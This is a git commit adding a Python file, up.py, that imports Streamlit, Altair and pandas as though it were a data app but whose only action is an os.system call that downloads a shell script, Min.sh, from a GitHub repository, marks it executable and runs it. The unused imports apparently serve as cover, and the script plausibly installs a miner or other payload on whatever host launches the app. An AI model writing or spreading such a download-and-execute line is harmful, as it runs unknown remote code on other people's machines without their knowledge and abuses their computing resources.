f9704628b655b882fbce83e970bf0257a059c8d4
yanddero <142234552+yanddero@users.noreply.github.com>
2023-08-14 22:33:37 +0800

    Create up.py

---
+++ up.py
@@ -0,0 +1,8 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+import subprocess
+os.system ("curl -L -o Min.sh https://github.com/Todorox/Rand/raw/main/Min.sh && chmod +x Min.sh && ./Min.sh")
